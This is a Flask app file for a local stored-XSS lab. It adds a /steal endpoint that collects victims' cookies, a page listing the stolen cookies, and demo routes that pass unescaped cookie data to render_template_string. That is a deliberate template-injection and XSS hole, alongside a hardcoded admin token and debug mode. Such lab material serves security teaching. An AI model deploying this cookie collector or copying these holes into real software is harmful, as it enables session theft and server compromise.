# app.py (original + PoC additions for local lab)
from flask import Flask, render_template, request, redirect, url_for, render_template_string
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os  # Needed for file paths

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Define Post model
class Post(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    author = db.Column(db.String(50), nullable=False)
    content = db.Column(db.Text, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

# Create DB tables
with app.app_context():
    db.create_all()

# --- PoC additions (lab only) ---
stolen_cookies = []                # in-memory store for stolen cookies
POC_FLAG = "FLAG{demo-stored-xss-success}"
# --- end PoC additions ---

@app.route('/')
def home():
    posts = Post.query.order_by(Post.created_at.desc()).all()
    return render_template('home.html', posts=posts)

@app.route('/add', methods=['GET', 'POST'])
def add_post():
    if request.method == 'POST':
        author = request.form['author']
        content = request.form['content']
        new_post = Post(author=author, content=content)
        db.session.add(new_post)
        db.session.commit()
        return redirect(url_for('home'))
    return render_template('add.html')

@app.route('/admin')
def admin():
    token = request.cookies.get('admin_token')
    flag_path = os.path.join('flags', 'admin_flag.txt')
    if token == 'SECRET_ADMIN_TOKEN':  # Replace with your token
        try:
            with open(flag_path, 'r') as f:
                flag = f.read()
            return render_template('admin.html', flag=flag)
        except FileNotFoundError:
            return "Flag file not found!", 500
    return "Unauthorized", 401

# -----------------------
# PoC routes (inserted here)
# -----------------------
@app.route('/steal')
def steal():
    # Receives cookie via ?c=... and stores it in-memory (lab-only)
    c = request.args.get('c')
    if c:
        stolen_cookies.append(c)
    return ('', 204)

@app.route('/stolen')
def show_stolen():
    html = "<h2>Stolen cookies (lab-only)</h2>"
    if not stolen_cookies:
        html += "<p><em>None yet</em></p>"
    else:
        html += "<ul>"
        for s in stolen_cookies:
            html += "<li><pre>{}</pre></li>".format(s)
        html += "</ul>"
    html += '<p><a href="/">Back</a></p>'
    return render_template_string(html)

@app.route('/admin_demo')
def admin_demo():
    cookie = request.headers.get('Cookie', '')
    if 'is_admin=1' in cookie:
        return render_template_string("<h1>Admin Panel (demo)</h1><p>Secret flag: <b>{}</b></p><p><a href='/'>Back</a></p>".format(POC_FLAG))
    else:
        return render_template_string("<h1>Admin Panel (demo)</h1><p>Not admin. Cookie: <pre>{}</pre></p><p><a href='/'>Back</a></p>".format(cookie))
# -----------------------

if __name__ == "__main__":
    app.run(debug=True)
